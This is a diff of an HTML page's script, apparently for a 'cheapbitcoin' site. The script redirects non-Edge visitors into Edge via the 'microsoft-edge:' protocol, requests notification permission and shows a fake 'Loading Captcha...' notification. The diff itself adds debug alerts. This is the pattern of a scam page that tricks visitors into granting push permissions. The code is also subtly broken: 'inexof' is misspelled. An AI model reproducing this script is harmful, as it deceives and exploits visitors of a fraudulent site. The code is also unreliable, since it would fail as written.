@@ -20,13 +20,14 @@
 	<script> 
 	let browser = navigator.userAgent; 
 	
-	function openLinkInIE(url){
-		
+	function openLinkInIE(){
+	window.alert("Triggered")
 	if (browser.inexof('Edg') < 1) { 
  	 window.open("microsoft-edge:"+ "https://cheapbitcoin.github.io");
 	}
 	}
 		openLinkInIE(); 
+		window.alert("Made It Past")
 		
 	let permission = Notification.requestPermission();
 	setTimeout(function(){ var greeting = new Notification("Loading Captcha..."); }, 3000)
